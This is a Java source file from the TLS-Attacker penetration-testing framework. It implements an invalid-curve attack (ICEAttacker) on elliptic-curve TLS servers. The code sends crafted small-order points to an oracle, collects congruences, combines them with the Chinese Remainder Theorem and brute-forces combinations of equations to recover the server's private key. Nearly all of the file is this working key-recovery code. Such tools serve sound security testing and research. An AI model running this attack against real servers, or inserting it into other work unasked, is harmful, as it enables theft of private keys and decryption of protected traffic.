/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.ec;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.ec.oracles.ECOracle;
import de.rub.nds.tlsattacker.core.constants.NamedGroup;
import de.rub.nds.tlsattacker.core.crypto.ec.CurveFactory;
import de.rub.nds.tlsattacker.core.crypto.ec.EllipticCurve;
import de.rub.nds.tlsattacker.core.crypto.ec.Point;
import de.rub.nds.tlsattacker.util.MathHelper;
import java.math.BigInteger;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 *
 */
public class ICEAttacker {

    private static final Logger LOGGER = LogManager.getLogger();

    private final ServerType server;

    /**
     * Oracle point multiplication is error prone so with a possibility of about
     * 1-5% we can get an invalid result. Thus, we perform additional equations
     * and make combinations with these equations. This gives us a higher
     * probability that we get a valid result.
     */
    private final int oracleAdditionalEquations;

    private final ECOracle oracle;

    private final NamedGroup group;

    private final EllipticCurve curve;

    /**
     *
     * @param oracle
     * @param server
     * @param oracleAdditionalEquations
     * @param group
     */
    public ICEAttacker(ECOracle oracle, ServerType server, int oracleAdditionalEquations, NamedGroup group) {
        this.oracle = oracle;
        this.server = server;
        this.oracleAdditionalEquations = oracleAdditionalEquations;
        this.group = group;
        curve = CurveFactory.getCurve(group);
    }

    /**
     *
     * @return
     */
    public BigInteger attack() {
        BigInteger result = null;
        long currentTime = System.currentTimeMillis();
        switch (server) {
            case NORMAL:
                result = attackNormal();
                break;
            case ORACLE:
                result = attackOracle();
                break;
        }
        LOGGER.info("Time needed for the attack: {} seconds", ((System.currentTimeMillis() - currentTime) / 1000));
        return result;
    }

    private BigInteger attackNormal() {
        List<ICEPoint> points = ICEPointReader.readPoints(group);
        List<BigInteger> congs = new LinkedList<>();
        List<BigInteger> moduli = new LinkedList<>();
        for (ICEPoint point : points) {
            BigInteger cong = getCongruence(point);
            if (cong != null) {
                BigInteger mod = BigInteger.valueOf(point.getOrder());
                BigInteger squareCong = cong.modPow(new BigInteger("2"), mod);
                congs.add(squareCong);
                moduli.add(mod);
                LOGGER.info("Successfully found: x = +/- " + cong + " mod " + point.getOrder());
                LOGGER.info("Using equation: x^2 =   " + squareCong + " mod " + point.getOrder());

                BigInteger prodModuli = computeModuliProduct(moduli);
                if (prodModuli.bitLength() > (curve.getModulus().bitLength() * 2)) {
                    /**
                     * It is not necessary to test all the points. For a correct
                     * CRT computation it is just needed that the moduli product
                     * is larger than the secret we are searching for. Thus, we
                     * can remove some of the values
                     */
                    LOGGER.info("We have found enough congruences for computing a CRT");
                    break;
                }
            } else {
                LOGGER.info("No congruence found for point with order " + point.getOrder());
            }
        }

        BigInteger sqrtResult = MathHelper.CRT(congs, moduli);
        BigInteger result = MathHelper.bigIntSqRootFloor(sqrtResult);
        LOGGER.info("Result found: {}", result);
        LOGGER.info("Number of server queries: {}", oracle.getNumberOfQueries());
        return result;
    }

    private BigInteger attackOracle() {
        List<ICEPoint> points = ICEPointReader.readPoints(group);
        List<BigInteger> congs = new LinkedList<>();
        List<BigInteger> moduli = new LinkedList<>();
        int additionalEquations = 0;
        for (int i = points.size() - 1; i >= 0; i--) {
            ICEPoint point = points.get(i);
            BigInteger cong = getCongruence(point);
            if (cong != null) {
                BigInteger mod = BigInteger.valueOf(point.getOrder());
                BigInteger squareCong = cong.modPow(new BigInteger("2"), mod);
                congs.add(squareCong);
                moduli.add(mod);
                LOGGER.info("Successfully found: x = +/- " + cong + " mod " + point.getOrder());
                LOGGER.info("Using equation: x^2 =   " + squareCong + " mod " + point.getOrder());

                BigInteger prodModuli = computeModuliProduct(moduli);
                if (prodModuli.bitLength() > (curve.getModulus().bitLength() * 2 + 4)) {
                    /**
                     * It is not necessary to test all the points. For a correct
                     * CRT computation it is just needed that the moduli product
                     * is larger than the secret we are searching for. Thus, we
                     * can remove some of the values
                     */
                    LOGGER.info("We have found enough congruences for computing a CRT, computing additional equations");
                    if (additionalEquations == oracleAdditionalEquations) {
                        break;
                    } else {
                        additionalEquations++;
                    }
                }
            } else {
                LOGGER.info("No congruence found for point with order " + point.getOrder());
            }
        }

        int[] usedOracleEquations = initializeUsedOracleEquations(moduli.size() - oracleAdditionalEquations);
        BigInteger[] congsArray = ArrayConverter.convertListToArray(congs);
        BigInteger[] moduliArray = ArrayConverter.convertListToArray(moduli);
        int lastElementPointer = usedOracleEquations.length - 1;
        BigInteger result = bruteForceWithAdditionalOracleEquations(usedOracleEquations, congsArray, moduliArray,
                lastElementPointer);

        if (result != null) {
            LOGGER.info("Result found: {}", result);
            LOGGER.info("Number of server queries: {}", oracle.getNumberOfQueries());
        } else {
            LOGGER.info("Unfortunately, no result found. Try to increase the number of additional equations.");
        }
        return result;
    }

    /**
     * Creates recursively all possible combinations of equations and tries to
     * compute the server private key with CRT.
     *
     * @param usedOracleEquations
     *            The used oracle equations
     * @param congs
     *            The congruences
     * @param modulis
     *            The modulis
     * @param pointer
     *            the pointer
     * @return
     */
    public BigInteger bruteForceWithAdditionalOracleEquations(int[] usedOracleEquations, BigInteger[] congs,
            BigInteger[] modulis, int pointer) {

        int[] eq = Arrays.copyOf(usedOracleEquations, usedOracleEquations.length);
        int maxValue = (pointer == usedOracleEquations.length - 1) ? (congs.length)
                : (usedOracleEquations[pointer + 1]);
        int minValue = usedOracleEquations[pointer];
        for (int i = minValue; i < maxValue; i++) {
            eq[pointer] = i;
            if (pointer > 0) {
                bruteForceWithAdditionalOracleEquations(eq, congs, modulis, (pointer - 1));
            } else {
                LOGGER.debug("Trying the following combination: {}", Arrays.toString(eq));
                BigInteger sqrtResult = computeCRTFromCombination(usedOracleEquations, congs, modulis);
                BigInteger r = MathHelper.bigIntSqRootFloor(sqrtResult);
                LOGGER.info("Guessing the following result: {}", r);
                if (oracle.isFinalSolutionCorrect(r)) {
                    return r;
                }
            }
        }
        return null;
    }

    /**
     * Computes CRT from a given combination of congs and modulis
     *
     * @param usedOracleEquations
     *            The used oracle equations
     * @param congs
     *            The congruences
     * @param modulis
     *            The modulis
     * @return CRTF
     */
    private BigInteger computeCRTFromCombination(int[] usedOracleEquations, BigInteger[] congs, BigInteger[] modulis) {
        BigInteger[] usedCongs = new BigInteger[usedOracleEquations.length];
        BigInteger[] usedModulis = new BigInteger[usedOracleEquations.length];
        for (int i = 0; i < usedOracleEquations.length; i++) {
            usedCongs[i] = congs[usedOracleEquations[i]];
            usedModulis[i] = modulis[usedOracleEquations[i]];
        }
        return MathHelper.CRT(usedCongs, usedModulis);
    }

    private int[] initializeUsedOracleEquations(int size) {
        int[] usedEquations = new int[size];
        for (int i = 0; i < usedEquations.length; i++) {
            usedEquations[i] = i;
        }
        return usedEquations;
    }

    /**
     * Uses the oracle to get a congruence for a specific point
     *
     * @param point
     *            A Point
     * @return The Congruence
     */
    private BigInteger getCongruence(ICEPoint point) {
        BigInteger secretModOrder = BigInteger.ZERO;
        // BigInteger secretModOrder = new BigInteger("240");
        for (int i = 1; i < point.getOrder(); i++) {
            secretModOrder = secretModOrder.add(BigInteger.ONE);
            Point guess = curve.mult(secretModOrder, point);
            if (oracle.checkSecretCorrectnes(point, guess.getX().getData())) {
                return secretModOrder;
            }
        }
        return null;
    }

    private BigInteger computeModuliProduct(List<BigInteger> moduli) {
        BigInteger prodModuli = BigInteger.ONE;
        for (BigInteger mod : moduli) {
            prodModuli = prodModuli.multiply(mod);
        }
        return prodModuli;
    }

    /**
     *
     */
    public enum ServerType {

        /**
         *
         */
        NORMAL,
        /**
         *
         */
        ORACLE
    }
}
